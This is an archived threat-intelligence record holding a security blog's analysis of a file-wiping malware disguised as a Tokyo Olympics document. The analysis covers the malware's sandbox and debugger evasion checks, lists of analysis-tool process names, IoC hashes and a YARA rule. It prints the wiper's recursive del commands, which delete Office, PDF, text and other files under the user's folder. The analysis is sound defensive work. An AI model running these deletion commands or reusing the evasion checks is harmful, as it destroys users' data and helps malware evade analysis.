{
    "id": "3a4b77d8-71da-40fe-b891-c224dad4d2f8",
    "created_at": "2023-01-12T15:00:11.609615Z",
    "updated_at": "2025-03-27T02:06:07.955801Z",
    "deleted_at": null,
    "sha1_hash": "9d244f9b2c3b49966f58c89771fa90bcedd1da47",
    "title": "2021-08-02 - A Deep-Dive Analysis Of A New Wiper Malware Disguised As Tokyo Olympics Document",
    "authors": "",
    "file_creation_date": "2022-05-27T23:08:07Z",
    "file_modification_date": "2022-05-27T23:08:07Z",
    "file_size": 780816,
    "plain_text": "# A Deep-dive Analysis of a New Wiper Malware Disguised as Tokyo Olympics Document\n\n**[blog.cyble.com/2021/08/02/a-deep-dive-analysis-of-a-new-wiper-malware-disguised-as-tokyo-olympics-document/](https://blog.cyble.com/2021/08/02/a-deep-dive-analysis-of-a-new-wiper-malware-disguised-as-tokyo-olympics-document/)**\n\nAugust 2, 2021\n\nRecently, Cyble Research Labs came across a new malware sample on the surface web. The malware\nin question belongs to the Wiper family. The sample was posted by a security researcher\non [Twitter. From VirusTotal, we learned that the original name of the malware is【至急】東京オリンピッ](https://twitter.com/_lpvoid/status/1420039826330501126)\nク開催に伴うサイバー攻撃等発生に関する被害報告について.exe. The translation of the file name\nis “[Urgent] About the damage report about the occurrence of cyber-attacks etc. accompanying\n**the Tokyo Olympics .exe”.**\n\nIn this case, the name of the sample suggests that it could be used to leverage the interest surrounding\nthe Tokyo Olympics.\n\nThe Wiper malware family has been created with the intent to delete selected documents\ncontaining extensions that are predefined in the malware by the Threat\nActor (TA). Figure 1 showcases the complete execution flow of the Wiper malware.\n\n\n-----\n\n_Figure 1 Wiper Malware Execution Flow_\n\n## Technical Analysis\n\nThe static analysis of the malware indicated that it is packed using Ultimate Packer for Executables\n(UPX), an open-source executable packer that supports various file formats across operating systems.\nAfter unpacking the malware, we found that it is an x86 architecture console-based application. It\nwas developed using C/C++ language and compiled on “2021-07-20 06:52:05”. These details are\nshown in Figure 1. The malware also uses an Adobe PDF icon to trick unsuspecting users into opening\nthe malware.\n\n_Figure 2: Malware’s Static Details_\nBased on our initial observations, Cyble researchers found that the malware doesn’t perform\nany other activities apart from deleting itself from the victim’s device. Similarly, we can see in\nFigure 3, that the malware executes the “Del” command to delete itself.\n\n\n-----\n\n_Figure 3: Wiper Malware’s Process Tree_\n\n## Code Analysis\n\nOur research indicates that the TA behind the malware has added multiple anti-VM/antidebugging/AntiSandBox techniques, as\nshown in Figure 4, These techniques include checking for ProcMon, VM Detection, Debugger Detection,\nSleep, and EnumWindows etc.\n\n_Figure 4: Code to Detect VM and Debugger_\nUsing EnumWindows API Call, the malware checks if any strings mentioned in Table 1 are\nmatching any running processes in the top-level application titles to check whether\nany malware analysis tools are running in the background.\n\n\n-----\n\nPROCMON_WINDOW_CLASS\n\nOllyDbg\nTIdaWindow\n\nWinDbgFrameClass\n\nFilemonClass\n\nID\n\nRegmonClass\n\nPROCEXPL\n\nTCPViewClass\n\nSmartSniff\n\nAutoruns\n\nCNetmonMainFrame\n\nTFormFileAlyzer2\n\nProcessHacker\n\n_Table 1 Running Process String_\nOur research indicates that the Wiper malware also checks for the processes shown in Table 2 to\ndetermine if it is running in any malware analysis environment. In case these processes are running, the\nmalware exits and deletes itself.\n\n\n-----\n\nWireshark.exe\n\napateDNS.exe\n\nAutoruns.exe\n\nbindiff.exe\n\nidaq.exe\n\nidaq64.exe\n\nProcmon.exe\n\nx64dbg.exe\n\nx32dbg.exe\n\nollydbg.exe\n\nImmunityDebugger.exe\n\nVBoxTray.exe\n\nVBoxService.exe\n\nmsedge.exe\n\nVirtualBox.exe\n\njavaw.exe\n\nx96dbg.exe\n\nidaw.exe\n\nwindbg.exe\n\ndnSpy.exe\n\nHxD.exe\n\nScylla_x64.exe\n\nScylla_x86.exe\n\nregmon.exe\n\nprocexp.exe\n\nprocexp64.exe\n\nTcpview.exe\n\nsmsniff.exe\n\nFakeNet.exe\n\nnetmon.exe\n\nPEiD.exe\n\nLordPE.exe\n\nPE-bear.exe\n\nPPEE.exe\n\ndie.exe\n\ndiel.exe\n\npexplorer.exe\n\ndepends.exe\n\nResourceHacker.exe\n\nFileAlyzer2.exe\n\nprocesshacker.exe\n\nRegshot-x64-Unicode.exe\n\n_Table 2: Process List_\nFigure 5 shows the malware comparing the running processes with the process list.\n\n_Figure 5: Process Comparison_\nThe malware also checks whether any soft breakpoint has been added on a VMDetection method or\nnot, as shown in Figure 6.\n\n\n-----\n\n_Figure 6 Code to check soft_\n\n_breakpoints_\nThe TA has added the above checks to ensure that the malware runs on the physical device and not on\nany malware analysis environment. If any one of the checks is positive, the malware exits and deletes\nitself.\n\nOnce all the checks are done, the malware executes a series of commands to delete the files that have\nthe extension specified by the TA in the malware, as shown in Figure 7.\n\n_Figure 7: Malware Executing Command to Delete *.doc Files_\nThe series of commands used to delete files that have the extensions specified by the TA are given in\nTable 3.\n\ndel /S /Q *.doc c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.docm c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.docx c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.dot c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.dotm c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.dotx c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.pdf c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.csv c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.xls c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.xlsx c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.xlsm c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *. ppt c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.pptx c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *. pptm c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.jtdc c:\\\\users\\\\% username% \\> nul\n\ndel /S /Q *.jttc c:\\\\users\\\\%username%\\\\ > nul\n\n**del /S /Q *.jtd c:\\\\users\\\\%username%\\\\ > nul**\n\ndel /S /Q *.jtt c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.txt c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.exe c:\\\\users\\\\%username%\\\\ > nul\n\ndel /S /Q *.log c:\\\\users\\\\%username%\\\\ > nul\n\n_Table 3: Commands Executed by Malware_\nAs we can see in Table 3, the malware checks for several file extensions including .jtd, which is an\nextension for a Japanese word processor.\n\nOnce it executes all the commands given in Table 3, it runs the curl command to access an adult\nwebsite. However, the intent of this behavior is unknown.\n\nFigure 8 shows the execution of the curl command to access the adult website.\n\n\n-----\n\n_Figure 8: Curl Command Execution_\nThe malware self-destructs after completing all the activities discussed above.\n\n## Conclusion \n\nBased on the name of malware executable file, “[Urgent] About the damage report about the\n**occurrence of cyber–attacks etc. accompanying the Tokyo Olympics .exe”, and the fact that the**\nmalware checks for. jtd extensions,we suspect that it has been potentially created to leverage the recent\ninterest around the Tokyo Olympics.\n\nThe TA provided this malware with the functionality to delete files that have extensions specified by the\nTA. It does not demonstrate any other behavior that is generally displayed by malware.\n\nCyble Research Labs is continuously monitoring security threats, whether they are ongoing or\nemerging. We will continue to update our readers with our latest findings.\n\n## Our Recommendations\n\nWe have listed some of the essential cybersecurity best practices that create the first line of control\nagainst attackers. We recommend that our readers follow the suggestions given below:\n\nUse strong passwords and enforce multi-factor authentication wherever possible.\n\nTurn on the automatic software update feature on your computer, mobile, and other connected\ndevices wherever possible and pragmatic.\nUse a reputed anti-virus and Internet security software package on your connected devices,\nincluding PC, laptop, and mobile.\nRefrain from opening untrusted links and email attachments without verifying their authenticity.\nConduct regular backup practices and keep those backups offline or in a separate network.\n\n## MITRE ATT&CK® Techniques:\n\n**Tactic** **Technique ID** **Technique Name**\n\n\n-----\n\n**Execution** [T1204](https://attack.mitre.org/techniques/T1204/) User Execution\n\n**Defense** [T1497](https://attack.mitre.org/techniques/T1497/) Virtualization/Sandbox Evasion\n\n**Impact** [T1485](https://attack.mitre.org/techniques/T1485/) Data Destruction\n\n## Indicators of Compromise (IoCs):\n\n**Indicators** **Indicator**\n**type**\n\n\n**Description**\n\n\nfb80dab592c5b2a1dcaaf69981c6d4ee7dbf6c1f25247e2ab648d4d0dc115a97 Hash SHA-256\n\n295d0aa4bf13befebafd7f5717e7e4b3b41a2de5ef5123ee699d38745f39ca4f Hash SHA-256\n\n## Generic Signatures and Rules\n\n### Yara Rules\n```\nrule win32_tokyoolympicdeleter \n{ \nmeta: \nauthor= \"Cyble Research\" \ndate= \"2021-08-03\" \ndescription= \"Coverage for Malware targeting Tokyo Olympics\" \nhash= \"fb80dab592c5b2a1dcaaf69981c6d4ee7dbf6c1f25247e2ab648d4d0dc115a97\" \nstrings: \n$header= \"MZ\" \n$sig1 = \"meClassOFilemon\" wide ascii \n$sig2 = \"iewSmartSniffg\" wide ascii \n$sig3 = \"TFormFileAlyzer2\" wide ascii \n$sig4 = \"TIdaWindow\" wide ascii \n    condition: \n$header at 0 and (2 of ($sig*)) \n}\n\n## About Us\n\n```\n\n-----\n\n[Cyble is a global threat intelligence SaaS provider that helps enterprises protect themselves from](https://cyble.com/)\ncybercrimes and exposure in the Darkweb. Its prime focus is to provide organizations with real-time\nvisibility to their digital risk footprint. Backed by Y Combinator as part of the 2021 winter\ncohort, Cyble has also been recognized by Forbes as one of the top 20 Best Cybersecurity Startups To Watch In 2020. Headquartered in Alpharetta, Georgia, and with offices in Australia, Singapore,\nand India, Cyble has a global presence. To learn more about Cyble, visit [www.cyble.com.](https://cyble.com/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-02 - A Deep-Dive Analysis Of A New Wiper Malware Disguised As Tokyo Olympics Document.pdf"
    ],
    "report_names": [
        "2021-08-02 - A Deep-Dive Analysis Of A New Wiper Malware Disguised As Tokyo Olympics Document.pdf"
    ],
    "threat_actors": [
        {
            "id": "c28760b2-5ec6-42ad-852f-be00372a7ce4",
            "created_at": "2022-10-27T08:27:13.172734Z",
            "updated_at": "2025-03-27T02:00:55.511386Z",
            "deleted_at": null,
            "main_name": "Ember Bear",
            "aliases": [
                "Ember Bear",
                "UNC2589",
                "Bleeding Bear",
                "DEV-0586",
                "Cadet Blizzard",
                "Frozenvista",
                "UAC-0056"
            ],
            "source_name": "MITRE:Ember Bear",
            "tools": [
                "P.A.S. Webshell",
                "CrackMapExec",
                "ngrok",
                "WhisperGate",
                "Saint Bot",
                "PsExec",
                "Rclone",
                "Impacket",
                "OutSteel"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "119c8bea-816e-4799-942b-ff375026671e",
            "created_at": "2022-10-25T16:07:23.957309Z",
            "updated_at": "2025-03-27T02:02:10.048343Z",
            "deleted_at": null,
            "main_name": "Operation Ghostwriter",
            "aliases": [
                "DEV-0257",
                "Operation Asylum Ambuscade",
                "PUSHCHA",
                "Storm-0257",
                "TA445",
                "UAC-0051",
                "UAC-0057",
                "UNC1151"
            ],
            "source_name": "ETDA:Operation Ghostwriter",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "HALFSHELL",
                "Impacket",
                "RADIOSTAR",
                "VIDEOKILLER",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535611,
    "ts_updated_at": 1743041167,
    "ts_creation_date": 1653692887,
    "ts_modification_date": 1653692887,
    "files": {
        "pdf": "https://archive.orkl.eu/9d244f9b2c3b49966f58c89771fa90bcedd1da47.pdf",
        "text": "https://archive.orkl.eu/9d244f9b2c3b49966f58c89771fa90bcedd1da47.txt",
        "img": "https://archive.orkl.eu/9d244f9b2c3b49966f58c89771fa90bcedd1da47.jpg"
    }
}